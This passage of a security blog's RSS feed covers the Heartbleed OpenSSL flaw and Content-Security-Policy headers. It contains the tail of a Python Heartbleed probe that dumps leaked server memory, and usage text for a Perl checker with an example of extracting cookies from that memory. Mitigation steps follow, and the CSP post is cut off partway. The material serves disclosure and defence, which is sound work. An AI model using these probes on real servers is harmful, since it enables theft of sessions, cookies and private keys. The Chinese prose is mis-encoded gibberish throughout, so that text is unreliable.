            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;WARNING: server returned more data than it should - server is vulnerable!&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server processed malformed heartbeat, but did not return any extra data.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received alert:&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server returned error, likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Connecting...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending Client Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Waiting for Server Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server closed connection without sending Server Hello.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Look for server hello done message.
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending heartbeat request...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;è‡ªæˆ‘æ¸¬è©¦å·¥å…· &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨æ–¹æ³•ç›´æ¥åŸ·è¡Œã€Œperl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443ã€ï¼Œå¯åœ¨ç¶²åŸŸåç¨±å¾ŒæŒ‡å®šç‰¹å®š SSL é€£æ¥åŸ ã€‚&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨èªªæ˜ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)
Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port
  --starttls proto[:arg] - start plain and upgrade to SSL with
			   starttls protocol (imap,smtp,http,pop)
  -T|--timeout T         - use timeout (default 5)
  -H|--heartbeats N      - number of heartbeats (default 1)
  -s|--show-data [L]     - show heartbeat response if vulnerable, optional
                           parameter L specifies number of bytes per line (16)
  -R|--show-regex-data R - show data matching perl regex R. Option can be
                           used multiple times
  -q|--quiet             - don&apos;t show anything, exit 1 if vulnerable
  -h|--help              - this screen

Examples:
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check direct www, imaps .. server
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443
  check-ssl-heartbleed.pl www.google.com:https
  check-ssl-heartbleed.pl mail.google.com:imaps

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;try to get Cookies
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &apos;Cookie:.*&apos; www.broken-site.com:443

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check webserver via proxy
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check imap server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check pop server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check smtp server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587
  &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;æ‡‰å°æªæ–½&quot;&gt;æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;p&gt;å¦‚æœç™¼ç¾è‡ªå·±çš„ä¼ºæœå™¨æœ‰é€™æ¨£çš„æ¼æ´ï¼Œè©²æ€éº¼è¾¦å‘¢ï¼Ÿ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¢ºèªè‡ªå·±çš„ OpenSSL ç‰ˆæœ¬æ˜¯å¦åœ¨å—å®³ç¯„åœ&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ ssltest.py æª¢æ¸¬å·¥å…·æª¢æ¸¬æ˜¯å¦å«æœ‰æ¼æ´&lt;/li&gt;
  &lt;li&gt;æ›´æ–° OpenSSL è‡³ 1.0.1g æˆ– 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;é‡é–‹æ‰€æœ‰èˆ‡ OpenSSL å‡½å¼åº«ç›¸é—œä¹‹æœå‹™&lt;/li&gt;
  &lt;li&gt;é‡æ–°ç”¢ç”Ÿ SSL Private Key (å› ç‚º Private Key å¯èƒ½è—‰ç”±æ¼æ´å¤–æ´©)&lt;/li&gt;
  &lt;li&gt;å°‡ç¶²ç«™èˆŠæ†‘è­‰æ’¤éŠ·&lt;/li&gt;
  &lt;li&gt;æ¸…é™¤æ‰€æœ‰ç›®å‰ç¶²é ä¼ºæœå™¨ä¸Šçš„ Session ï¼ˆå› ç‚ºå¯èƒ½é­åˆ°ç«Šå–ï¼‰&lt;/li&gt;
  &lt;li&gt;å¿…è¦æ™‚æ›´æ›ç¶²ç«™å…§ä½¿ç”¨è€…å¯†ç¢¼ï¼Œæˆ–æ˜¯å¯†åˆ‡è¿½è¹¤ç¶²ç«™æ˜¯å¦æœ‰å¸³è™Ÿç›œç”¨çš„æƒ…æ³ç™¼ç”Ÿ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è©³ç´°è¨è«–èˆ‡å»ºè­°å¯ä»¥åƒè€ƒ
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;èª°æœƒæ˜¯ç›®æ¨™å‘¢&quot;&gt;èª°æœƒæ˜¯ç›®æ¨™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;çœŸçš„æœƒæœ‰æ”»æ“Šè€…åˆ©ç”¨é€™æ¨£çš„æ”»æ“Šæ‰‹æ³•å—ï¼Ÿç›®å‰åœ¨&lt;a href=&quot;http://wooyun.org&quot;&gt;çƒé›² wooyun&lt;/a&gt;å¹³å°ä¸Šå·²ç¶“æ»¿æ»¿çš„è³‡å®‰ç ”ç©¶å“¡é–‹å§‹å›å ±ç¶²ç«™å«æœ‰ OpenSSL æ¼æ´ã€‚ä¹Ÿæœ‰é§­å®¢åœ¨å˜—è©¦æ’°å¯«æ›´æœ‰æ•ˆçš„æ”»æ“Šåˆ©ç”¨ç¨‹å¼ï¼Œæƒ³è¦è—‰æ­¤æŠŠå¹³å¸¸æ‰“ä¸ä¸‹ä¾†çš„ç¶²ç«™ä¸€èˆ‰æ”»é™·ã€‚&lt;/p&gt;

&lt;p&gt;æ€æ¨£çš„ç«™å°æœƒæ˜¯é‡é»ç›®æ¨™å‘¢ï¼Ÿå«æœ‰æœƒå“¡æ©Ÿåˆ¶çš„ç¶²ç«™ç‰¹åˆ¥å¦‚æ­¤ï¼Œä¾‹å¦‚ Web Mailã€ç¤¾ç¾¤ç¶²ç«™ç­‰ç­‰ã€‚å› æ­¤ä¸å°‘ä¼æ¥­è¦å¤šæ³¨æ„äº†ï¼Œä¾‹å¦‚å…¨ä¸–ç•Œæœ€å¤§çš„ç¤¾ç¾¤ç¶²ç«™ Facebookã€SlideShareã€å°ç£çŸ¥åé›»ä¿¡å…¬å¸ç¶²ç«™ã€ç¤¾äº¤å¹³å°ã€ç¶²è·¯éŠ€è¡Œã€NASï¼Œéƒ½æœƒåœ¨é€™æ³¢çš„æ”»æ“Šç¯„åœä¹‹å…§ã€‚å¦‚æœæ²’æœ‰å„˜é€Ÿä¿®å¾©ï¼Œç­‰åˆ°æ›´æœ‰æ•ˆçš„æ”»æ“Šç¨‹å¼å‡ºç¾ï¼Œå°±çœŸçš„ç­‰è‘—å¤±è¡€äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;å°±é€£ OpenSSL é€™ç¨®æ­·å²æ‚ ä¹…è€Œä¸”é‡è¦çš„å‡½å¼åº«ï¼Œéƒ½å¯èƒ½çŠ¯é€™ç¨®åŸºæœ¬çš„ C èªè¨€ç¨‹å¼è¨­è¨ˆéŒ¯èª¤ï¼Œè€èˆŠçš„ç¨‹å¼ç¢¼ä¸€å®šæœ‰ä¸å°‘é™³å¹´éºæ¯’ï¼Œå¦‚æœæ²’æœ‰å¾¹åº•æ¸…æŸ¥ï¼Œé¡ä¼¼çš„å¿ƒè‡Ÿå™´è¡€äº‹ä»¶æœƒä¸æ–·ä¸Šæ¼”ã€‚å¤§å®¶å¿«é»æ­¢è¡€å§ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/</link>
                <guid>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</guid>
                <pubDate>Wed, 09 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Content-Security-Policy - HTTP Headers çš„è³‡å®‰è­°é¡Œ (2)</title>
                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—åœ¨ä¸Šä¸€ç¯‡ &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers çš„è³‡å®‰è­°é¡Œ (1)&lt;/a&gt; æ–‡ç« ä¸­ï¼Œæˆ‘å€‘æåˆ°äº†å¤šç¨®è³‡å®‰ç›¸é—œçš„ HTTP headers å—ï¼Ÿæ¥ä¸‹ä¾†çš„å¹¾ç¯‡æ–‡ç« æˆ‘å€‘æœƒä»‹ç´¹å¹¾å€‹å°ˆé–€å°ä»˜ XSS çš„ HTTP headersï¼Œé¦–å…ˆå°±ç”± Content-Security-Policy æ‰“é ­é™£ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;ï¼ˆä»¥ä¸‹ç°¡ç¨± CSPï¼‰æ˜¯å¾ 2010 å¹´è¢«æå‡ºä¾†çš„ä¸€é … Web è¦æ ¼ï¼Œä¸»è¦ç›®çš„æ˜¯ç”¨ä¾†é˜²æ­¢ Cross-Site Scriptingï¼ˆä»¥ä¸‹ç°¡ç¨± XSSï¼‰è·Ÿç¶²é æ¨£å¼ç½®æ›ï¼ˆä¾‹å¦‚&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;ç§‘æŠ€éƒ¨è¢«æƒ¡æ&lt;/a&gt;å°±æ˜¯ä¸€å€‹æœ€å¥½çš„ä¾‹å­ï¼‰ã€‚ç¶“éäº”å¹´ç™¼å±•ï¼ŒCSP 1.0 å·²å¾ W3C çš„ TR (Technical Report) è®Šæˆ &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;ï¼Œæ‡‰è©²ä¸ä¹…å°±æœƒå°‡æˆç‚º W3C æ¨è–¦æ¨™æº–ã€‚æ–°çš„ &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; å‰‡ä»åœ¨è‰æ¡ˆéšæ®µã€‚&lt;/p&gt;

&lt;p&gt;CSP å®¶æ—é¾å¤§ï¼Œç¸½å…±æœ‰ä¸‰å€‹é¡åˆ¥ï¼Œå…­å€‹é …ç›®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ CSP ç™¼å±•åˆæœŸï¼Œä¸»æµç€è¦½å™¨ä¸¦æœªå…¨éƒ¨ä¾ç…§åŒä¸€æ¨™æº–ä¾†é–‹ç™¼ï¼Œå› æ­¤ç™¼å±•æˆé€™ä¸‰ç¨®é¡åˆ¥ã€‚ç›®å‰ç”±æ–¼ CSP 1.0 å³å°‡æˆç‚ºæ¨™æº–ï¼Œå¤§å¤šæ•¸ç€è¦½å™¨å·²æ”¯æ´ Content-Security-Policy é€™å€‹é¡åˆ¥ï¼Œå› æ­¤ç‹€æ³å·²é€æ¼¸æ”¶æ–‚ã€‚ä¸»æµç€è¦½å™¨çš„æ”¯æ´åˆ—è¡¨å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; title=&quot;Content-Security-Policy ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾åˆ—è¡¨ä¸­å¯çœ‹åˆ°ï¼Œåªè¦ä½¿ç”¨ Content-Security-Policy èˆ‡ X-Content-Security-Policy å°±å·²æœ‰å¾ˆé«˜çš„è¦†è“‹ç‡ï¼Œé™¤éè¦æ”¯æ´ Safari 6ï¼Œå¦å‰‡ä¸ç”¨ç‰¹æ„ä½¿ç”¨ X-WebKit-CSPã€‚æ›´è©³ç´°çš„ç€è¦½å™¨æ”¯æ´åˆ—è¡¨å¯åƒè€ƒ &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-ä¸»è¦ä½œç”¨&quot;&gt;CSP 1.0 ä¸»è¦ä½œç”¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;è¼‰å…¥ä¾†æºç™½åå–®&lt;/p&gt;

    &lt;p&gt;å®£å‘Šä¸€çµ„å—ä¿¡ä»»çš„ç™½åå–®èˆ‡è³‡æºç¨®é¡ï¼ˆå¦‚ JavaScript, CSS, image ç­‰ç­‰ï¼‰ï¼Œä½¿ç€è¦½å™¨åªèƒ½å¾æ­¤ç™½åå–®ä¸­è¼‰å…¥è³‡æºï¼Œè—‰æ­¤é˜²æ­¢æ”»æ“Šè€…å¾å¤–éƒ¨å¼•å…¥å«æœ‰æƒ¡æ„ç¨‹å¼ç¢¼çš„è³‡æºã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜selfâ€™ http://js.devco.re; style-src â€˜selfâ€™ http://css.devco.re; img-src â€˜selfâ€™ data:; frame-src â€˜noneâ€™&lt;/p&gt;

    &lt;p&gt;æ•ˆæœï¼šé™å®š script è³‡æºåªèƒ½å¾ http://js.devco.re è¼‰å…¥ï¼›é™å®š style è³‡æºåªèƒ½å¾ http://css.devco.re è¼‰å…¥ï¼›é™å®š img åªèƒ½å¾ç›¸åŒ domain è¼‰å…¥ï¼Œä¸¦ä¸”æ”¯æ´ data schemeï¼›é™å®š frame ä¸èƒ½å¾ä»»ä½•ä¾†æºè¼‰å…¥ï¼›é™¤äº† scriptã€styleã€imgã€frame ä¹‹å¤–çš„è³‡æºï¼Œå‰‡åªèƒ½å¾åŒæ¨£ domain ä»¥åŠåŒæ¨£å”å®šçš„ä¾†æºè¼‰å…¥ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç¦æ­¢ inline ç¨‹å¼ç¢¼&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬äººé–‹ç™¼ç¶²ç«™æ™‚ç‚ºæ±‚ä¾¿åˆ©ï¼Œç¶“å¸¸æœƒåœ¨ HTML ä¸­å¯«å…¥ä¸€äº› inline ç¨‹å¼ç¢¼ï¼Œä½†æ”»æ“Šè€…æ„åœ–å…¥ä¾µç¶²ç«™æ™‚ä¹Ÿå¸¸ç”¨æ­¤æ‰‹æ³•ã€‚ç„¶è€Œç€è¦½å™¨å…¶å¯¦ç„¡æ³•åˆ†è¾¨é€™äº› inline ç¨‹å¼ç¢¼ç©¶ç«Ÿæ˜¯é–‹ç™¼äººå“¡å¯«çš„ï¼Œé‚„æ˜¯æ”»æ“Šè€…æ¤å…¥çš„ã€‚å› æ­¤ CSP ä¹¾è„†å¼·è¿«é–‹ç™¼è€…å¿…é ˆæŠŠæ‰€æœ‰ inline ç¨‹å¼ç¢¼ç§»åˆ°å¤–éƒ¨æª”æ¡ˆï¼Œå®Œå…¨æœçµ•åœ¨ HTML ä¸­å‡ºç¾ inline ç¨‹å¼ç¢¼çš„ç‹€æ³ã€‚å› æ­¤é™¤éä½ åœ¨ CSP å®£å‘Šæ™‚æœ‰è¨»æ˜ â€˜unsafe-inlineâ€™ï¼Œå¦å‰‡ CSP é è¨­ç¦æ­¢ä½¿ç”¨ inline script æˆ– inline CSSã€‚&lt;/p&gt;

    &lt;p&gt;ä¾‹ï¼šContent-Security-Policy: default-src â€˜selfâ€™; script-src â€˜unsafe-inlineâ€™&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç¦æ­¢ eval å‡½å¼&lt;/p&gt;

